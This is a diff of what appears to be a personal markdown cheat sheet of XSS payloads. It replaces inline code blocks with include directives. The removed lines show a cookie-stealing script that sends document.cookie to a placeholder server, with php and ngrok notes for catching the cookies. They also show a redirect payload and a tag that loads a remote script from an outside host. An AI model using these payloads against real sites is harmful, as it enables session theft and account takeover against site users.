@@ -2,25 +2,12 @@
 
 ### Maybe useful payloads:
 
-```js
-//cookie stealer
-<script>document.location=“http://yourserver.com/?c="+document.cookie;</script>
-/*
-For example, to start a little server with php and ngrok i do:
-php -S localhost:<port>
-ngrok http <port>
-*/
-```
+@@include[cookie-stealer.js](useful/cookie-stealer.js)
 
-```js
-//redirect
-<script>window.location="https://example.com"</script>
-```
 
-```js
-//include a remote or local script
-<script src="https://sussy.com/yourscript.js"></script>
-```
+@@include[redirect.js](useful/redirect.js)
+
+@@include[include.js](useful/include.js)
 
 ### Other:
 
